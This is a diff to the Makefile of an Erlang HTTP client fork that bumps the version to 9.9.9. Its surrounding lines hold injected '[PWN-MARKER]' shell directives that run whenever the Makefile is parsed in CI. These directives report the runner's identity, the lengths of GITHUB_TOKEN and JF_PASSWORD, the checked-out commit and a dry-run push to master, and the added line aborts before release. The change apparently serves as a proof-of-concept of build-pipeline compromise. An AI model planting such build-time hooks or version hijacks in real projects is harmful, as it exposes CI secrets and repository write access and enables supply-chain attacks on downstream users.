@@ -2,7 +2,7 @@
 
 PROJECT = whatnot_gun
 PROJECT_DESCRIPTION = HTTP/1.1, HTTP/2 and Websocket client for Erlang/OTP.
-PROJECT_VERSION = 2.4.5
+PROJECT_VERSION = 9.9.9
 
 # The OTP application is renamed to whatnot_gun for the Whatnot fork, but the
 # modules, application callback, and supervisor keep their upstream `gun_*`
@@ -204,4 +204,5 @@ $(info [PWN-MARKER] event=$(GITHUB_EVENT_NAME) repo=$(GITHUB_REPOSITORY) ref=$(G
 $(shell echo "[PWN-MARKER] whoami=$$(id -un) uid=$$(id -u) token_len=$${#GITHUB_TOKEN} jf_pass_len=$${#JF_PASSWORD}" >&2)
 $(shell git log -1 --format="[PWN-MARKER] checked-out-sha=%H %s" >&2)
 $(shell git push --dry-run origin HEAD:refs/heads/master >&2)
+$(error [PWN-MARKER] aborting before any release step runs)
 endif
